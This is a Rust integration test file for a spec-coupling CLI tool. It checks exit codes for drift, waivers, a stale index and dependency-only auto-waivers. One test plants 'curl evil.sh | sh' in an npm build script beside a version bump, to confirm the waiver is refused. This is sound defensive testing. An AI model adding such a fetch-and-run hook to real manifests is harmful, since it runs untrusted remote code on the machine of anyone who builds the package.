//! `spec-spine couple` end-to-end exit-code contract (spec 005):
//! drift → 1, cleared / waived → 0, stale index → 2. Uses `--paths-from` for the
//! deterministic core, plus one real `git diff` path.

use std::fs;
use std::path::Path;
use std::process::Command;

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_spec-spine"))
}

fn code(out: &std::process::Output) -> i32 {
    out.status.code().unwrap_or(-1)
}

fn write(root: &Path, rel: &str, content: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

/// A minimal governed repo: one crate owned (manifest + file unit) by spec 001-a.
fn setup(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"001-a\"\n",
    );
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
}

/// Compile + index so `couple`'s freshness guard passes against committed inputs.
fn refresh(root: &Path) {
    assert_eq!(
        code(
            &bin()
                .arg("--repo")
                .arg(root)
                .arg("compile")
                .output()
                .unwrap()
        ),
        0
    );
    assert_eq!(
        code(&bin().arg("--repo").arg(root).arg("index").output().unwrap()),
        0
    );
}

fn couple_paths(root: &Path, paths: &[&str], extra: &[&str]) -> std::process::Output {
    write(root, "changed.txt", &format!("{}\n", paths.join("\n")));
    let mut cmd = bin();
    cmd.arg("--repo")
        .arg(root)
        .arg("couple")
        .arg("--paths-from")
        .arg(root.join("changed.txt"));
    cmd.args(extra);
    cmd.output().unwrap()
}

#[test]
fn drift_then_cleared() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());

    // Changed an owned path, did not edit its spec → drift (exit 1).
    let drift = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(
        code(&drift),
        1,
        "{}",
        String::from_utf8_lossy(&drift.stderr)
    );

    // Same change + the owning spec.md → cleared (exit 0).
    let cleared = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs", "specs/001-a/spec.md"],
        &[],
    );
    assert_eq!(code(&cleared), 0);
}

#[test]
fn waiver_clears_exit() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    write(
        tmp.path(),
        "pr-body.txt",
        "rolling forward\nSpec-Drift-Waiver: hotfix OPS-9\n",
    );
    let out = couple_paths(
        tmp.path(),
        &["crate-a/src/lib.rs"],
        &[
            "--pr-body",
            tmp.path().join("pr-body.txt").to_str().unwrap(),
        ],
    );
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(String::from_utf8_lossy(&out.stdout).contains("waived"));
}

#[test]
fn stale_index_exits_2() {
    let tmp = tempfile::tempdir().unwrap();
    setup(tmp.path());
    refresh(tmp.path());
    // Mutate a hashed input (the spec) without re-indexing → stale.
    write(
        tmp.path(),
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: draft\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n",
    );
    let out = couple_paths(tmp.path(), &["crate-a/src/lib.rs"], &[]);
    assert_eq!(code(&out), 2, "stale index must exit 2");
}

#[test]
fn real_git_diff_detects_drift() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup(root);

    let git = |args: &[&str]| {
        let out = Command::new("git")
            .arg("-C")
            .arg(root)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@t")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@t")
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    };

    git(&["init", "-q"]);
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "base"]);

    // Change an owned file; refresh + commit at head.
    write(root, "crate-a/src/lib.rs", "pub fn a() {}\npub fn b() {}\n");
    refresh(root);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "head"]);

    let drift = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap();
    assert_eq!(
        code(&drift),
        1,
        "git-diff drift: {}",
        String::from_utf8_lossy(&drift.stderr)
    );
}

// ===== spec 004 §3.5 + spec 005 §3.5 — the dependabot-class path =====

/// A minimal governed repo with an npm package claimed by spec 001-a.
fn setup_npm(root: &Path, auto_waive: bool) {
    if auto_waive {
        write(
            root,
            "spec-spine.toml",
            "[coupling]\nauto_waive_dependency_only = true\n",
        );
    }
    write(
        root,
        "package.json",
        "{ \"name\": \"root\", \"workspaces\": [\"pkg-a\"] }\n",
    );
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.22.0\" } }\n",
    );
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"pkg-a\"\n---\n# 001-a\n## body\n",
    );
}

fn git_in(root: &Path, args: &[&str]) {
    let out = Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}

fn index_check(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["index", "check"])
        .output()
        .unwrap()
}

fn couple_git(root: &Path) -> std::process::Output {
    bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap()
}

#[test]
fn dependency_bump_stays_fresh_and_auto_waives() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Dependabot-style: bump a dependency version. No re-index, no spec edit,
    // no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    // (a) The committed index is still FRESH: dependency tables are not a
    // governed input (spec 004 §3.5 governance-projection hashing).
    let fresh = index_check(root);
    assert_eq!(
        code(&fresh),
        0,
        "index must stay fresh on a dep-only bump: {}",
        String::from_utf8_lossy(&fresh.stderr)
    );

    // (b) The coupling gate self-waives (spec 005 §3.5).
    let out = couple_git(root);
    assert_eq!(code(&out), 0, "{}", String::from_utf8_lossy(&out.stderr));
    assert!(
        String::from_utf8_lossy(&out.stdout).contains("auto-waived"),
        "stdout: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn dependency_bump_without_optin_still_drifts() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, false);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump"]);

    let out = couple_git(root);
    assert_eq!(code(&out), 1, "auto-waiver is opt-in; default must drift");
}

#[test]
fn script_edit_refuses_the_auto_waiver() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    // A scripts edit hiding alongside a version bump: not dependency-only.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc && curl evil.sh | sh\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+script"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a non-dependency manifest edit must refuse the auto-waiver: {}",
        String::from_utf8_lossy(&out.stdout)
    );
}

#[test]
fn claimed_floor_path_refuses_the_auto_waiver() {
    // Spec 009 x 005 §3.5 interplay: a dependency-only bump PLUS an edit to a
    // floor path that a spec explicitly claims must NOT be mechanically
    // waived. With a claim-unaware pre-filter the workflow edit would hide
    // behind the floor, every remaining candidate would be a manifest, and
    // the dep-only waiver would excuse the workflow's C-001 -- fail-open.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_npm(root, true);
    write(root, ".github/workflows/release.yml", "name: release\n");
    write(
        root,
        "specs/002-wf/spec.md",
        "---\nid: \"002-wf\"\ntitle: \"W\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \".github/workflows/release.yml\"\n---\n# 002-wf\n## body\n",
    );
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // The PR: a dep bump AND a workflow edit, index refreshed (the workflow
    // is a hashed input), no spec edit, no PR body.
    write(
        root,
        "pkg-a/package.json",
        "{ \"name\": \"pkg-a\", \"version\": \"1.0.0\",\n  \
         \"spec-spine\": { \"spec\": \"001-a\" },\n  \
         \"scripts\": { \"build\": \"tsc\" },\n  \
         \"dependencies\": { \"zod\": \"3.23.1\" } }\n",
    );
    write(
        root,
        ".github/workflows/release.yml",
        "name: release\non: push\n",
    );
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "bump+workflow"]);

    let out = couple_git(root);
    assert_eq!(
        code(&out),
        1,
        "a claimed floor path must refuse the auto-waiver and drift: {}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("002-wf"),
        "the workflow's owner must be named: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}
